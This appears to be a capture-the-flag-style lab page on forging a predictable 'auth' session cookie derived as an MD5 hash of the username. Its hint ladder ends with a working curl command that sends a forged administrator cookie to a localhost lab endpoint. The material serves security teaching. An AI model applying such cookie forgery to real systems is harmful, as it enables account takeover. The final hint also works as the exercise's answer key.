# Lab 13 — Predictable session token

**Difficulty:** ★★ Practitioner
**Goal:** read the flag from `/admin`
**You have:** a working account `wiener` / `peter`

The `auth` cookie isn't the username — it's something derived from it. If
the derivation is deterministic, it's forgeable.

## Hint ladder

**Hint 1 (stuck):** Log in as `wiener` and grab the `auth` cookie value.
What does it look like? Compare it to `wiener`; compare it to known
digest formats (length 32, hex…).

**Hint 2 (still stuck):** Try `printf 'wiener' | md5sum` and compare with
the cookie you were issued. If they match, run the same for
`administrator` and send that value as the cookie.

**Hint 3 (last rung — the actual attack):**
```bash
TOK=$(printf 'administrator' | md5sum | cut -d' ' -f1)
curl -s -H "Cookie: auth=$TOK" http://127.0.0.1:8113/admin
```

## Reset

```bash
docker compose restart lab13-predictable-session-cookie
```